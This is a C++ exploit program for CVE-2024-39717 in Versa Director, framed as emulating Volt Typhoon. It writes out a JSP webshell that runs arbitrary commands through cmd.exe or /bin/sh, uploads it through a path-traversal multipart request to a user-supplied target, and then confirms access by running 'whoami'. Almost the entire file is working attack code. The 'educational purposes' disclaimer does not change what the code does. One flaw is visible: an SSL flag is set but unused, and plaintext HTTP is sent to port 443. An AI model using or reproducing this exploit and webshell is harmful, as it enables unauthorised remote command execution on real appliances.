// Volt Typhoon Versa Director Exploit Payload
// C++ appliance exploitation with HTTP request crafting and webshell upload
// MITRE ATT&CK: T1190 (Exploit Public-Facing Application)

// For educational and research purposes only
// Author: Nour A
// Reference: CVE-2024-39717

// manual compile: x86_64-w64-mingw32-g++ -o versa_exploit.exe versa_exploit.cpp -lws2_32 -lwininet -static

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <sstream>
#include <cstring>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wininet.lib")

#define MAX_RESPONSE_SIZE 65536
#define CONNECT_TIMEOUT 10000

struct ExploitConfig {
    std::string target_host;
    int target_port;
    std::string upload_path;
    std::string webshell_filename;
    bool use_ssl;
};


std::string generate_boundary() {
    char boundary[33];
    srand(GetTickCount());
    for (int i = 0; i < 32; i++) {
        boundary[i] = "0123456789abcdef"[rand() % 16];
    }
    boundary[32] = '\0';
    return std::string(boundary);
}


std::string build_jsp_webshell() {
    // minimal JSP webshell matching Volt Typhoon's observed payloads
    std::string webshell =
        "<%@ page import=\"java.util.*,java.io.*\"%>\n"
        "<%\n"
        "if (request.getParameter(\"c\") != null) {\n"
        "  String cmd = request.getParameter(\"c\");\n"
        "  Process p;\n"
        "  String os = System.getProperty(\"os.name\").toLowerCase();\n"
        "  if (os.contains(\"win\")) {\n"
        "    p = Runtime.getRuntime().exec(new String[]{\"cmd.exe\", \"/c\", cmd});\n"
        "  } else {\n"
        "    p = Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", cmd});\n"
        "  }\n"
        "  Scanner sc = new Scanner(p.getInputStream()).useDelimiter(\"\\\\A\");\n"
        "  out.print(sc.hasNext() ? sc.next() : \"\");\n"
        "  sc = new Scanner(p.getErrorStream()).useDelimiter(\"\\\\A\");\n"
        "  out.print(sc.hasNext() ? sc.next() : \"\");\n"
        "}\n"
        "%>";
    return webshell;
}


std::string craft_multipart_request(const ExploitConfig& config,
                                     const std::string& webshell) {
    std::string boundary = generate_boundary();

    // build multipart body
    std::string body;
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\""
         + config.webshell_filename + "\"\r\n";
    body += "Content-Type: application/octet-stream\r\n\r\n";
    body += webshell;
    body += "\r\n--" + boundary + "--\r\n";

    // CVE-2024-39717: path traversal in destPath parameter
    std::string traversal = "../../../../var/versa/vnms/web/custom_logo/";
    std::string path = config.upload_path + "?destPath=" + traversal;

    // build full HTTP request
    std::ostringstream request;
    request << "POST " << path << " HTTP/1.1\r\n";
    request << "Host: " << config.target_host << "\r\n";
    request << "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n";
    request << "Content-Type: multipart/form-data; boundary=" << boundary << "\r\n";
    request << "Content-Length: " << body.length() << "\r\n";
    request << "Connection: close\r\n";
    request << "X-Forwarded-For: 127.0.0.1\r\n";
    request << "\r\n";
    request << body;

    return request.str();
}


bool send_exploit(const ExploitConfig& config, const std::string& request) {
    WSADATA wsData;
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        std::cerr << "[-] WSAStartup failed" << std::endl;
        return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "[-] Socket creation failed" << std::endl;
        WSACleanup();
        return false;
    }

    // set timeout
    DWORD timeout = CONNECT_TIMEOUT;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));

    // resolve target
    struct addrinfo hints = {0}, *result = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    std::string port_str = std::to_string(config.target_port);
    if (getaddrinfo(config.target_host.c_str(), port_str.c_str(),
                    &hints, &result) != 0) {
        std::cerr << "[-] DNS resolution failed for " << config.target_host << std::endl;
        closesocket(sock);
        WSACleanup();
        return false;
    }

    std::cout << "[+] Connecting to " << config.target_host
              << ":" << config.target_port << "..." << std::endl;

    if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR) {
        std::cerr << "[-] Connection failed: " << WSAGetLastError() << std::endl;
        freeaddrinfo(result);
        closesocket(sock);
        WSACleanup();
        return false;
    }

    freeaddrinfo(result);
    std::cout << "[+] Connected. Sending exploit payload..." << std::endl;

    // send request
    int total_sent = 0;
    int remaining = request.length();
    while (remaining > 0) {
        int sent = send(sock, request.c_str() + total_sent, remaining, 0);
        if (sent == SOCKET_ERROR) {
            std::cerr << "[-] Send failed" << std::endl;
            closesocket(sock);
            WSACleanup();
            return false;
        }
        total_sent += sent;
        remaining -= sent;
    }

    std::cout << "[+] Payload sent (" << total_sent << " bytes)" << std::endl;

    // receive response
    char response[MAX_RESPONSE_SIZE] = {0};
    int received = recv(sock, response, MAX_RESPONSE_SIZE - 1, 0);
    if (received > 0) {
        // parse HTTP status code
        std::string resp_str(response, received);
        size_t status_pos = resp_str.find(" ");
        if (status_pos != std::string::npos) {
            std::string status = resp_str.substr(status_pos + 1, 3);
            std::cout << "[+] Server response: HTTP " << status << std::endl;
            if (status == "200" || status == "201") {
                std::cout << "[+] Upload successful!" << std::endl;
                std::cout << "[+] Webshell deployed to: https://" << config.target_host
                          << "/custom_logo/" << config.webshell_filename << std::endl;
                return true;
            }
        }
    }

    closesocket(sock);
    WSACleanup();
    return false;
}


void verify_webshell(const ExploitConfig& config) {
    // attempt to access the deployed webshell
    std::string verify_path = "/custom_logo/" + config.webshell_filename + "?c=whoami";

    std::cout << "\n[+] Verifying webshell access..." << std::endl;
    std::cout << "[+] GET https://" << config.target_host << verify_path << std::endl;

    HINTERNET hInternet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0
    );

    if (!hInternet) {
        std::cerr << "[-] InternetOpen failed" << std::endl;
        return;
    }

    std::string full_url = "https://" + config.target_host + verify_path;
    HINTERNET hUrl = InternetOpenUrlA(
        hInternet, full_url.c_str(), NULL, 0,
        INTERNET_FLAG_SECURE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
        0
    );

    if (hUrl) {
        char buffer[4096] = {0};
        DWORD bytesRead;
        if (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead)) {
            std::cout << "[+] Webshell response: " << buffer << std::endl;
        }
        InternetCloseHandle(hUrl);
    } else {
        std::cerr << "[-] Verification request failed" << std::endl;
    }

    InternetCloseHandle(hInternet);
}


int main(int argc, char* argv[]) {
    std::cout << "=========================================" << std::endl;
    std::cout << "VOLT TYPHOON APPLIANCE EXPLOIT" << std::endl;
    std::cout << "CVE-2024-39717 Versa Director" << std::endl;
    std::cout << "=========================================" << std::endl;
    std::cout << std::endl;
    std::cout << "[!] FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY" << std::endl;
    std::cout << std::endl;

    if (argc < 2) {
        std::cout << "Usage: " << argv[0] << " <target_host> [port]" << std::endl;
        std::cout << "Example: " << argv[0] << " versa.target.com 443" << std::endl;
        return 1;
    }

    ExploitConfig config;
    config.target_host = argv[1];
    config.target_port = (argc > 2) ? atoi(argv[2]) : 443;
    config.upload_path = "/versa/app/upload";
    config.webshell_filename = "custom_logo.jsp";
    config.use_ssl = true;

    std::cout << "[*] Target: " << config.target_host << ":" << config.target_port << std::endl;
    std::cout << "[*] Exploit: CVE-2024-39717 (Arbitrary File Upload)" << std::endl;
    std::cout << "[*] Payload: JSP Webshell" << std::endl;
    std::cout << std::endl;

    // generate webshell payload
    std::string webshell = build_jsp_webshell();
    std::cout << "[+] Generated webshell (" << webshell.length() << " bytes)" << std::endl;

    // craft exploit request
    std::string request = craft_multipart_request(config, webshell);
    std::cout << "[+] Crafted exploit request (" << request.length() << " bytes)" << std::endl;

    // send exploit
    if (send_exploit(config, request)) {
        verify_webshell(config);
    }

    return 0;
}
